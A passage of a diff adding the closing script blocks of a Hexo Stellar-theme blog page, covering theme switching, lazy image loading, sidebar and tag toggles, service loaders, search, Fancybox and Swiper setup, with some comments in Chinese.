+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `Switched to Light Mode`,
+      dark: `Switched to Dark Mode`,
+      auto: `Switched to Auto Mode`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
